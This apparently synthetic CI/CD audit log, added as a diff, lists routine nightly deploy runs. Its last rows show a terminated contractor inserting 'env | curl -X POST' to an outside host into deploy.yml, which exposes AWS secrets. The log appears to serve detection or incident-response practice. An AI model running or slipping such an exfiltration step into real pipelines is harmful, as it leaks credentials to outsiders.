@@ -1,0 +1,25 @@
+ts,action,actor,repo,workflow,runner,sourceIP,detail
+2026-09-07T02:13:00Z,workflows.completed,dev.ravi,example/app,deploy.yml,self-hosted-01,198.51.100.40,success
+2026-09-08T02:26:00Z,workflows.completed,dev.ravi,example/app,deploy.yml,self-hosted-01,198.51.100.40,success
+2026-09-09T02:39:00Z,workflows.completed,dev.ravi,example/app,deploy.yml,self-hosted-01,198.51.100.40,success
+2026-09-10T02:02:00Z,workflows.completed,dev.ravi,example/app,deploy.yml,self-hosted-01,198.51.100.40,success
+2026-09-11T02:15:00Z,workflows.completed,dev.ravi,example/app,deploy.yml,self-hosted-01,198.51.100.40,success
+2026-09-14T02:04:00Z,workflows.completed,dev.ravi,example/app,deploy.yml,self-hosted-01,198.51.100.40,success
+2026-09-15T02:17:00Z,workflows.completed,dev.ravi,example/app,deploy.yml,self-hosted-01,198.51.100.40,success
+2026-09-16T02:30:00Z,workflows.completed,dev.ravi,example/app,deploy.yml,self-hosted-01,198.51.100.40,success
+2026-09-17T02:43:00Z,workflows.completed,dev.ravi,example/app,deploy.yml,self-hosted-01,198.51.100.40,success
+2026-09-18T02:06:00Z,workflows.completed,dev.ravi,example/app,deploy.yml,self-hosted-01,198.51.100.40,success
+2026-09-21T02:45:00Z,workflows.completed,dev.ravi,example/app,deploy.yml,self-hosted-01,198.51.100.40,success
+2026-09-22T02:08:00Z,workflows.completed,dev.ravi,example/app,deploy.yml,self-hosted-01,198.51.100.40,success
+2026-09-23T02:21:00Z,workflows.completed,dev.ravi,example/app,deploy.yml,self-hosted-01,198.51.100.40,success
+2026-09-24T02:34:00Z,workflows.completed,dev.ravi,example/app,deploy.yml,self-hosted-01,198.51.100.40,success
+2026-09-25T02:47:00Z,workflows.completed,dev.ravi,example/app,deploy.yml,self-hosted-01,198.51.100.40,success
+2026-09-28T02:36:00Z,workflows.completed,dev.ravi,example/app,deploy.yml,self-hosted-01,198.51.100.40,success
+2026-09-29T02:49:00Z,workflows.completed,dev.ravi,example/app,deploy.yml,self-hosted-01,198.51.100.40,success
+2026-09-30T02:12:00Z,workflows.completed,dev.ravi,example/app,deploy.yml,self-hosted-01,198.51.100.40,success
+2026-10-01T02:25:00Z,workflows.completed,dev.ravi,example/app,deploy.yml,self-hosted-01,198.51.100.40,success
+2026-10-02T02:38:00Z,workflows.completed,dev.ravi,example/app,deploy.yml,self-hosted-01,198.51.100.40,success
+2026-10-05T02:27:00Z,workflows.completed,dev.ravi,example/app,deploy.yml,self-hosted-01,198.51.100.40,success
+2026-10-06T01:05:00Z,workflow.edited,ex.contractor,example/app,deploy.yml,self-hosted-01,203.0.113.77,added step: env | curl -X POST cdn-sync.example.net
+2026-10-06T01:08:00Z,workflow_run.triggered,ex.contractor,example/app,deploy.yml,self-hosted-01,203.0.113.77,off-hours; actor is a terminated contractor still referenced in automation
+2026-10-06T01:11:00Z,secret.retrieved,ex.contractor,example/app,deploy.yml,self-hosted-01,203.0.113.77,AWS_* env exposed to step
